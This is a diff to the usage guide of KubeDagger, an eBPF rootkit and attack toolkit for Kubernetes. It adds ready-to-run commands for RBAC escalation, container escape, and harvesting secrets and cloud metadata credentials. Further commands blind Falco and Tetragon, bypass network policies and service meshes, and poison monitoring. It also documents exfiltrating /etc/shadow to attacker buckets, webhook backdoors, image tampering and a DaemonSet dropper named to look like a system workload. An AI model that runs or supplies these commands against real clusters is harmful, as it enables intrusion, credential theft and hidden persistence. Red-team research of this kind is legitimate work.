@@ -16,16 +16,29 @@
   - [Kubernetes Discovery](#8-kubernetes-discovery)
   - [Process Tree](#9-process-tree)
   - [MITRE ATT&CK Export](#10-mitre-attck-export)
+  - [Kubernetes Privilege Escalation](#11-kubernetes-privilege-escalation)
+  - [Container Escape](#12-container-escape)
+  - [Secrets Harvesting](#13-secrets-harvesting)
+  - [Runtime Security Evasion](#14-runtime-security-evasion)
+  - [Network Policy Bypass](#15-network-policy-bypass)
+  - [Service Mesh Bypass](#16-service-mesh-bypass)
+  - [Observability Poisoning](#17-observability-poisoning)
+  - [Cloud Metadata Theft](#18-cloud-metadata-theft)
+  - [Cloud Exfiltration](#19-cloud-exfiltration)
+  - [Admission Webhook Backdoor](#20-admission-webhook-backdoor)
+  - [CRI-Level Image Tampering](#21-cri-level-image-tampering)
+  - [DaemonSet Dropper](#22-daemonset-dropper)
 - [Encrypted C2 Channel](#encrypted-c2-channel)
 - [Persistence](#persistence)
 - [Multi-Node Coordination](#multi-node-coordination)
+- [Integration Testing](#integration-testing)
 
 ---
 
 ## Prerequisites
 
-- Linux kernel 5.4+ with eBPF support
-- Go 1.22+
+- Linux kernel 5.4+ with eBPF support (BTF-enabled for CO-RE portability)
+- Go 1.25+
 - Kernel headers installed (`/lib/modules/$(uname -r)`)
 - clang & llvm 11+
 - Root privileges (for loading eBPF programs)
@@ -374,19 +387,392 @@ kubedagger-client mitre export --format markdown
 | `--format` | `json` | Output format: `json` or `markdown` |
 | `-o, --output` | stdout | Output file path |
 
-**Mapped techniques include:**
+**Mapped techniques (25 total):**
 | Technique | ID | KubeDagger Feature |
 |-----------|----|--------------------|
+| Implant Internal Image | T1525 | docker, webhook, cri-tamper |
 | Network Service Scanning | T1046 | network_discovery |
 | Data from Local System | T1005 | fs_watch |
-| Implant Internal Image | T1525 | docker override |
-| OS Credential Dumping | T1003 | postgres |
 | Process Injection | T1055 | pipe_prog |
 | Application Layer Protocol: DNS | T1071.004 | dns_exfil |
-| Hide Artifacts | T1564.001 | file/process hiding |
-| Scheduled Task/Job | T1053 | persistence |
+| Hide Artifacts: Hidden Files | T1564.001 | file/process hiding |
+| OS Credential Dumping | T1003 | postgres |
+| Scheduled Task/Job: Cron | T1053.003 | persistence |
+| Rootkit | T1014 | BPF program hiding |
+| Traffic Signaling | T1205 | XDP-based C2 |
+| Adversary-in-the-Middle | T1557 | DNS spoofing |
+| Escape to Host | T1611 | container escape |
+| System Information Discovery | T1082 | k8s discover |
+| Application Layer Protocol: Web | T1071.001 | HTTP C2 |
+| Impair Defenses | T1562.001 | evasion |
+| Native API | T1106 | eBPF syscall |
+| Cloud Instance Metadata API | T1552.005 | cloud meta |
+| Valid Accounts: Cloud | T1078.004 | cloud meta |
+| Credentials In Files | T1552.001 | secrets harvest |
+| Steal Application Access Token | T1528 | secrets harvest |
+| Network Boundary Bridging | T1599.001 | netbypass |
+| Proxy: Domain Fronting | T1090.004 | meshbypass |
+| Transfer Data to Cloud Account | T1537 | cloud exfil |
+| Data Manipulation: Transmitted | T1565.002 | obs-poison |
+| Container Orchestration Job | T1053.007 | daemonset |
 
 The JSON output is compatible with the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) for visualization.
+
+---
+
+### 11. Kubernetes Privilege Escalation
+
+Exploit Kubernetes RBAC misconfigurations to escalate privileges within the cluster.
+
+```shell
+# Escalate privileges using current service account
+kubedagger-client k8s abuse --action escalate
+
+# Dump secrets from accessible namespaces
+kubedagger-client k8s abuse --action dump-secrets
+
+# Use a specific stolen token
+kubedagger-client k8s abuse --action escalate --token "eyJhbGciOiJS..."
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | Action: `escalate` or `dump-secrets` |
+| `--token` | (auto-detect) | Bearer token to use for API calls |
+
+---
+
+### 12. Container Escape
+
+Detect and execute container escape techniques based on the runtime environment.
+
+```shell
+# Detect available escape vectors
+kubedagger-client escape --action detect
+
+# Auto-select and execute the best escape technique
+kubedagger-client escape --action execute --technique auto
+
+# Use a specific escape technique
+kubedagger-client escape --action execute --technique privileged
+kubedagger-client escape --action execute --technique socket
+kubedagger-client escape --action execute --technique cgroup
+kubedagger-client escape --action execute --technique nsenter
+
+# Save escape report
+kubedagger-client escape --action detect -o escape_vectors.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | `detect` (enumerate vectors) or `execute` (break out) |
+| `--technique` | `auto` | Technique: `auto`, `privileged`, `socket`, `cgroup`, `nsenter` |
+| `-o, --output` | stdout | Output file |
+
+**Techniques:**
+- **privileged** — Abuse `--privileged` container to mount host filesystem
+- **socket** — Exploit exposed Docker/containerd socket
+- **cgroup** — Abuse cgroup release_agent for code execution on host
+- **nsenter** — Use `nsenter` with host PID namespace access
+
+---
+
+### 13. Secrets Harvesting
+
+Harvest credentials and secrets from multiple sources on the target.
+
+```shell
+# Harvest from all available sources
+kubedagger-client secrets harvest --sources all
+
+# Target specific sources
+kubedagger-client secrets harvest --sources env,k8s
+kubedagger-client secrets harvest --sources cloud,vault
+
+# Save harvested secrets
+kubedagger-client secrets harvest --sources all -o secrets.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--sources` | `all` | Comma-separated: `all`, `env`, `k8s`, `cloud`, `docker`, `vault`, `kubeconfig` |
+| `-o, --output` | stdout | Output file |
+
+**Sources:**
+- **env** — Environment variables (AWS keys, tokens, passwords)
+- **k8s** — Kubernetes secrets from accessible namespaces
+- **cloud** — Cloud provider metadata credentials
+- **docker** — Docker config credentials (`~/.docker/config.json`)
+- **vault** — HashiCorp Vault token files
+- **kubeconfig** — Kubeconfig files with embedded credentials
+
+---
+
+### 14. Runtime Security Evasion
+
+Evade runtime security tools by disabling or blinding their eBPF-based sensors.
+
+```shell
+# Evade all supported security tools
+kubedagger-client evasion --mode all
+
+# Target a specific tool
+kubedagger-client evasion --mode falco
+kubedagger-client evasion --mode tetragon
+kubedagger-client evasion --mode kubearmor
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | (required) | Target: `falco`, `tetragon`, `kubearmor`, or `all` |
+
+**How it works:**
+- Detaches or corrupts the target tool's eBPF programs
+- Patches syscall entry points to skip security hooks
+- Modifies perf/ring buffer maps to drop events
+
+---
+
+### 15. Network Policy Bypass
+
+Bypass Kubernetes NetworkPolicies and CNI-enforced network segmentation.
+
+```shell
+# Tunnel traffic through an allowed path
+kubedagger-client netbypass --mode tunnel --dest-ip 10.0.5.3 --dest-port 443
+
+# Spoof source identity to bypass policy selectors
+kubedagger-client netbypass --mode spoof --dest-ip 10.0.5.3 --dest-port 80
+
+# Encapsulate traffic to evade deep packet inspection
+kubedagger-client netbypass --mode encap --dest-ip 10.0.5.3 --dest-port 8080
+
+# Direct bypass via XDP (skip TC-level policy enforcement)
+kubedagger-client netbypass --mode direct --dest-ip 10.0.5.3 --dest-port 443
+
+# Save results
+kubedagger-client netbypass --mode tunnel --dest-ip 10.0.5.3 --dest-port 443 -o bypass.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | (required) | Bypass method: `tunnel`, `spoof`, `encap`, `direct` |
+| `--dest-ip` | (required) | Destination IP address |
+| `--dest-port` | (required) | Destination port |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 16. Service Mesh Bypass
+
+Bypass service mesh sidecar proxies (Istio, Linkerd) to reach services directly.
+
+```shell
+# XDP-level bypass (fastest, skips sidecar entirely)
+kubedagger-client meshbypass --mode xdp --mesh-target 10.0.3.5:8080
+
+# UID-based bypass (send traffic as mesh proxy UID)
+kubedagger-client meshbypass --mode uid --mesh-target 10.0.3.5:8080
+
+# Raw socket bypass (avoid iptables redirect rules)
+kubedagger-client meshbypass --mode raw --mesh-target 10.0.3.5:8080
+
+# Exclude from mesh (modify pod annotations)
+kubedagger-client meshbypass --mode exclude --mesh-target 10.0.3.5:8080
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--mode` | (required) | Method: `xdp`, `uid`, `raw`, `exclude` |
+| `--mesh-target` | (required) | Target address (IP:port) |
+
+---
+
+### 17. Observability Poisoning
+
+Poison observability pipelines to hide activity or create alert fatigue.
+
+```shell
+# Hide metrics from Prometheus
+kubedagger-client obs-poison --target-system prometheus --endpoint http://prometheus:9090 --strategy hide
+
+# Inject noise into OpenTelemetry
+kubedagger-client obs-poison --target-system otel --endpoint http://otel-collector:4317 --strategy noise
+
+# Create alert fatigue in StatsD
+kubedagger-client obs-poison --target-system statsd --endpoint statsd:8125 --strategy fatigue
+
+# Save poisoning report
+kubedagger-client obs-poison --target-system prometheus --endpoint http://prometheus:9090 --strategy hide -o report.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--target-system` | (required) | Target: `prometheus`, `otel`, `statsd` |
+| `--endpoint` | (required) | Endpoint URL/address of the target system |
+| `--strategy` | (required) | Strategy: `hide` (suppress), `noise` (flood), `fatigue` (false alerts) |
+| `-o, --output` | stdout | Output file |
+
+---
+
+### 18. Cloud Metadata Theft
+
+Steal cloud instance credentials via the metadata service (IMDS).
+
+```shell
+# Auto-detect cloud provider and steal credentials
+kubedagger-client cloud meta --provider auto
+
+# Target a specific provider
+kubedagger-client cloud meta --provider aws
+kubedagger-client cloud meta --provider gcp
+kubedagger-client cloud meta --provider azure
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--provider` | `auto` | Cloud provider: `auto`, `aws`, `gcp`, `azure` |
+
+**What it retrieves:**
+- **AWS** — IAM role credentials from `169.254.169.254/latest/meta-data/iam/`
+- **GCP** — Service account tokens from `metadata.google.internal`
+- **Azure** — Managed identity tokens from `169.254.169.254/metadata/identity/`
+
+---
+
+### 19. Cloud Exfiltration
+
+Exfiltrate data to attacker-controlled cloud storage buckets.
+
+```shell
+# Exfil a file to S3 using stolen metadata credentials
+kubedagger-client cloud exfil --provider aws --bucket exfil-bucket --file /etc/shadow --creds-from meta
+
+# Exfil to GCS with manual credentials
+kubedagger-client cloud exfil --provider gcp --bucket exfil-bucket --file /tmp/dump.tar.gz --creds-from manual
+
+# Exfil to Azure Blob Storage
+kubedagger-client cloud exfil --provider azure --bucket exfil-container --file /tmp/secrets.json --creds-from meta
+
+# Save upload report
+kubedagger-client cloud exfil --provider aws --bucket exfil-bucket --file /etc/shadow --creds-from meta -o upload.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--provider` | (required) | Cloud provider: `aws`, `gcp`, `azure` |
+| `--bucket` | (required) | Destination bucket/container name |
+| `--file` | (required) | Local file path to exfiltrate |
+| `--creds-from` | `meta` | Credential source: `meta` (metadata service) or `manual` |
+| `-o, --output` | stdout | Output file for upload report |
+
+---
+
+### 20. Admission Webhook Backdoor
+
+Deploy a mutating admission webhook that injects a backdoor into new pods.
+
+```shell
+# Deploy the webhook backdoor
+kubedagger-client webhook --action deploy --namespace kube-system --image evil/injector:latest
+
+# Check webhook status
+kubedagger-client webhook --action deploy --namespace kube-system --image evil/injector:latest -o status.json
+
+# Remove the webhook
+kubedagger-client webhook --action remove --namespace kube-system
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | `deploy` or `remove` |
+| `--namespace` | `default` | Namespace for webhook resources |
+| `--image` | (required for deploy) | Container image for the webhook server |
+| `-o, --output` | stdout | Output file |
+
+**How it works:**
+1. Creates a MutatingWebhookConfiguration targeting pod creation
+2. Deploys a webhook server that injects a sidecar container into new pods
+3. The sidecar runs the specified image with host-level access
+
+---
+
+### 21. CRI-Level Image Tampering
+
+Tamper with container images at the Container Runtime Interface level, bypassing image pull verification.
+
+```shell
+# Overlay filesystem tampering (containerd)
+kubedagger-client cri-tamper --runtime containerd --mode overlay --target-image nginx:latest --inject-binary /tmp/backdoor
+
+# Content-addressable storage manipulation (CRI-O)
+kubedagger-client cri-tamper --runtime crio --mode cas --target-image webapp:v1 --inject-binary /tmp/implant
+
+# Runc binary replacement
+kubedagger-client cri-tamper --runtime containerd --mode runc --target-image "*" --inject-binary /tmp/evil-runc
+
+# Save tampering report
+kubedagger-client cri-tamper --runtime containerd --mode overlay --target-image nginx:latest --inject-binary /tmp/backdoor -o tamper.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--runtime` | (required) | Container runtime: `containerd` or `crio` |
+| `--mode` | (required) | Tampering mode: `overlay`, `cas`, `runc` |
+| `--target-image` | (required) | Image to tamper with (or `*` for runc mode) |
+| `--inject-binary` | (required) | Path to binary to inject |
+| `-o, --output` | stdout | Output file |
+
+**Modes:**
+- **overlay** — Modify the overlay filesystem layers after image extraction
+- **cas** — Manipulate content-addressable storage blobs directly
+- **runc** — Replace the runc binary to inject code at container start
+
+---
+
+### 22. DaemonSet Dropper
+
+Deploy KubeDagger as a DaemonSet for cluster-wide rootkit installation across all nodes.
+
+```shell
+# Deploy the DaemonSet
+kubedagger-client daemonset --action deploy --image kubedagger:latest --name kube-health --namespace kube-system
+
+# Check deployment status
+kubedagger-client daemonset --action status --name kube-health --namespace kube-system
+
+# Remove the DaemonSet
+kubedagger-client daemonset --action remove --name kube-health --namespace kube-system
+
+# Save status report
+kubedagger-client daemonset --action status --name kube-health --namespace kube-system -o status.json
+```
+
+**Flags:**
+| Flag | Default | Description |
+|------|---------|-------------|
+| `--action` | (required) | `deploy`, `remove`, or `status` |
+| `--image` | (required for deploy) | Container image to deploy |
+| `--name` | `kube-health` | DaemonSet name |
+| `--namespace` | `kube-system` | Target namespace |
+| `-o, --output` | stdout | Output file |
+
+**How it works:**
+1. Creates a privileged DaemonSet with `hostPID`, `hostNetwork`, and volume mounts
+2. Each pod loads KubeDagger's eBPF programs on its node
+3. Uses legitimate-sounding names to blend with system workloads
+4. Tolerates all taints to ensure deployment on every node (including control plane)
 
 ---
 
@@ -550,3 +936,23 @@ kubedagger-client proctree get
 | DNS exfil not working | Ensure outbound UDP/53 is allowed; try a different `--server` |
 | K8s discovery fails | Check service account permissions or kubeconfig path |
 | Persistence not surviving | Verify systemd is running or cron is enabled |
+| Container escape fails | Verify container is privileged or has required capabilities |
+| Cloud meta returns empty | Check IMDS accessibility (some environments block `169.254.169.254`) |
+
+---
+
+## Integration Testing
+
+KubeDagger includes integration tests that load eBPF programs into the kernel and verify correct attachment.
+
+```shell
+# Run integration tests (requires root and BTF-enabled kernel)
+sudo $(which go) test -tags integration -v -count=1 -timeout 60s ./pkg/kubedagger/
+```
+
+The integration tests use build tag `integration` and are separate from unit tests. They verify:
+- BPF programs load successfully via the BPF verifier
+- All kprobe/uprobe/XDP/TC programs attach to their hooks
+- Key BPF maps (`http_routes`, `dns_table`, `piped_progs`, `comm_prog_key`) are accessible
+
+CI runs these automatically on every push using GitHub Actions runners with BTF-enabled kernels.
